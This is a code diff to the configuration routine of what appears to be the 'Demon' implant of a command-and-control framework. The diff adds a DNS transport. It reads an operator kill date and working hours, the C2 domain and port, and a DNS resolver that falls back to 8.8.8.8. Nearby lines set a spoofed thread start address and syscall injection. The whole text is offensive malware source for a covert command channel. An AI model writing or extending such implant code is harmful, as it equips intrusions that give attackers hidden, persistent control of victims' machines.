@@ -832,6 +832,31 @@ VOID DemonConfig()
     Instance->Config.Transport.WorkingHours = ParserGetInt32( &Parser );
 #endif
 
+#ifdef TRANSPORT_DNS
+    Instance->Config.Transport.KillDate = ParserGetInt64( &Parser );
+    PRINTF( "KillDate: %d\n", Instance->Config.Transport.KillDate )
+
+    if ( Instance->Config.Transport.KillDate && GetSystemFileTime() >= Instance->Config.Transport.KillDate )
+    {
+        Instance->Win32.RtlExitUserThread( 0 );
+    }
+
+    Instance->Config.Transport.WorkingHours = ParserGetInt32( &Parser );
+
+    /* DNS Domain */
+    Buffer = ParserGetBytes( &Parser, &Length );
+    Instance->Config.Transport.Domain = Instance->Win32.LocalAlloc( LPTR, Length + 1 );
+    MemCopy( Instance->Config.Transport.Domain, Buffer, Length );
+    PRINTF( "[CONFIG] DNS Domain: %s\n", Instance->Config.Transport.Domain )
+
+    /* DNS Port */
+    Instance->Config.Transport.DnsPort = (WORD)ParserGetInt32( &Parser );
+    PRINTF( "[CONFIG] DNS Port: %d\n", Instance->Config.Transport.DnsPort )
+
+    /* DNS server IP — use 0 (will fallback to 8.8.8.8 in DnsSend) */
+    Instance->Config.Transport.DnsServerIp = 0;
+#endif
+
     Instance->Config.Implant.ThreadStartAddr = Instance->Win32.LdrLoadDll + 0x12; /* TODO: default -> change that or make it optional via builder or profile */
     Instance->Config.Inject.Technique        = INJECTION_TECHNIQUE_SYSCALL;
 
